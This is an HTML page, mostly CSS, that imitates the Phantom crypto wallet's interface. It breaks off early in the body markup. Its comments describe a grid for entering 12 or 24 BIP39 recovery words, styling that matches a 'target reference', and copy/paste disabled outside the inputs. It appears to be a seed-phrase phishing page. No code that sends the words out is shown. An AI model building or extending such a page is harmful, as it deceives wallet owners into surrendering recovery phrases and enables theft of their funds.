<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Phantom</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            /* Disable selection/copy/paste everywhere by default */
            user-select: none;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
        }

        /* Allow typing/selecting only within the word verification inputs */
        input {
            user-select: text !important;
            -webkit-user-select: text !important;
            -moz-user-select: text !important;
            -ms-user-select: text !important;
        }

        body {
            /* Darker purple background with a radial purple glow effect */
            background-color: #120c1f;
            background-image: radial-gradient(circle at 50% 50%, #291b45 0%, #120c1f 70%);
            color: #fff;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            padding: 24px 32px;
            overflow: hidden;
        }

        /* Top Header Navigation */
        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            width: 100%;
        }

        /* Top Left Phantom Ghost Icon */
        .ghost-logo {
            display: flex;
            align-items: center;
            justify-content: center;
            background: transparent;
            border: none;
            cursor: pointer;
            width: 32px;
            height: 32px;
        }

        .ghost-logo svg {
            width: 28px;
            height: 28px;
            fill: #dfdef2;
        }

        .help-link {
            color: #fff;
            background: transparent;
            border: 1px solid rgba(255, 255, 255, 0.15);
            text-decoration: none;
            font-size: 13px;
            font-weight: 400;
            display: flex;
            align-items: center;
            gap: 6px;
            padding: 5px 10px;
            border-radius: 8px;
        }

        .help-link:hover {
            background-color: rgba(255, 255, 255, 0.05);
        }

        /* Main Modal Container */
        .main-wrapper {
            display: flex;
            justify-content: center;
            align-items: center;
            flex: 1;
        }

        .modal {
            background-color: #0c0c0e;
            width: 440px; /* Reduced width to be less horizontal */
            max-height: 85vh;
            overflow-y: auto;
            border-radius: 22px;
            padding: 24px 20px 20px 20px;
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
            display: flex;
            flex-direction: column;
            align-items: center;
            position: relative;
        }

        /* Custom Scrollbar for Modal if 24-word mode scrolls */
        .modal::-webkit-scrollbar {
            width: 4px;
        }
        .modal::-webkit-scrollbar-thumb {
            background: #27272a;
            border-radius: 4px;
        }

        /* Pagination Dots */
        .dots {
            display: flex;
            gap: 6px;
            margin-bottom: 10px;
        }

        .dot {
            width: 6px;
            height: 6px;
            background-color: #3f3f46;
            border-radius: 50%;
        }

        .dot.active {
            background-color: #a855f7;
        }

        /* Modal Titles */
        .modal-title {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 4px;
            color: #fff;
            text-align: center;
        }

        .modal-subtitle {
            font-size: 12px;
            color: #8c8c9e;
            margin-bottom: 16px;
            text-align: center;
            line-height: 1.4;
        }

        /* Screen States */
        .screen-center {
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
            width: 100%;
            padding: 10px 0;
        }

        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid #27272a;
            border-top: 3px solid #a855f7;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .hidden {
            display: none !important;
        }

        /* Inputs Container Layout (More vertical, less horizontal 3-column setup) */
        .inputs-container {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 6px;
            width: 100%;
            margin-bottom: 12px;
        }

        .input-group {
            position: relative;
            background-color: #141417;
            border: 1px solid #232329;
            border-radius: 8px;
            padding: 4px 8px;
            height: 44px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            transition: border-color 0.2s;
        }

        .input-group.error {
            border-color: #ef4444;
            background-color: rgba(239, 68, 68, 0.05);
        }

        .input-group label {
            font-size: 10px;
            color: #71717a;
            line-height: 1;
            margin-bottom: 2px;
        }

        .input-group input {
            background: transparent;
            border: none;
            color: #fff;
            font-size: 13px;
            outline: none;
            width: 100%;
            line-height: 1.2;
        }

        /* Error Label Text */
        .error-message {
            color: #ef4444;
            font-size: 11px;
            width: 100%;
            margin-bottom: 10px;
            display: none;
            text-align: center;
        }

        /* Toggle Phrase Button */
        .toggle-phrase {
            color: #8c8c9e;
            background: none;
            border: none;
            font-size: 12px;
            cursor: pointer;
            margin-bottom: 14px;
            font-weight: 500;
            transition: color 0.25s ease;
        }

        .toggle-phrase:hover {
            color: #c084fc;
        }

        /* Action Buttons */
        .action-btn {
            width: 100%;
            background-color: #161619; /* Exact dark style matching target reference */
            color: #6b6b7b;
            border: 1px solid #27272c;
            border-radius: 12px;
            padding: 12px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        /* Active purple state when all BIP39 words are correctly entered */
        .action-btn.active-ready {
            background-color: #a855f7;
            color: #000;
            border-color: #a855f7;
        }

        .action-btn.active-ready:hover {
            opacity: 0.9;
        }
    </style>
</head>

            <div class="screen-center" id="welcomeScreen">
                <div class="dots">
                    <div class="dot active"></div>
